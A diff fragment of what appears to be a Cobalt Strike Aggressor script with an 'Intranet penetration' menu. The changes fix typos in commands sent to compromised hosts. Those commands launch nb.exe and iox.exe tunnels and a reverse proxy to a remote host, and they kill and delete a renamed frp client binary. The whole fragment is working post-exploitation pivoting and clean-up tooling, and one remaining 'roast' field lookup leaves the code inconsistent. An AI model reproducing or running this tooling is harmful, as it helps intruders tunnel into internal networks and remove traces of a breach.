@@ -34,13 +34,13 @@ menu "Intranet penetration" {
 		item "stop frpc" {
 			local('$bid');
 			foreach $bid ($1){
-				bshell($1, "taskkill -f /im frpmodift.exe");
+				bshell($1, "taskkill -f /im frpmodify.exe");
 			}
 		}
 		item "remove frpc" {
 			local('$bid');
 			foreach $bid ($1){
-				bshell($1, "taskkill -f /im frpmodift.exe & del /f /s /q frpmodify.exe");
+				bshell($1, "taskkill -f /im frpmodify.exe & del /f /s /q frpmodify.exe");
 			}
 		}
 	}
@@ -115,7 +115,7 @@ menu "Intranet penetration" {
 			dialog_show($dialog);
 		}
 		sub nb_run{
-			local ('$lhost $roast');
+			local ('$lhost $rhost');
 			$lhost = $3['lhost'];
 			$rhost = replace($3['rhost'], "\"", "");
 			bshell($bid, "nb.exe -slave  $+ $lhost  $+ $rhost");
@@ -162,7 +162,7 @@ menu "Intranet penetration" {
 			dialog_show($dialog);
 		}
 		sub iox_fwdrun{
-			local ('$lhost $roast $hex');
+			local ('$lhost $rhost $hex');
 			$lhost = $3['lhost'];
 			$rhost = replace($3['rhost'], "\"", "");
 			$hex = $3['hex'];
@@ -179,8 +179,8 @@ menu "Intranet penetration" {
 			dialog_show($dialog);
 		}
 		sub iox_proxyrun{
-			local ('$roast $hex');
-			$roast = $3 ['roast'];
+			local ('$rhost $hex');
+			$rhost = $3 ['roast'];
 			$hex = replace($3['hex'], "\"", "");
 			bshell($bid, "iox.exe proxy -r  $+ $rhost -k  $+ $hex");
 		}
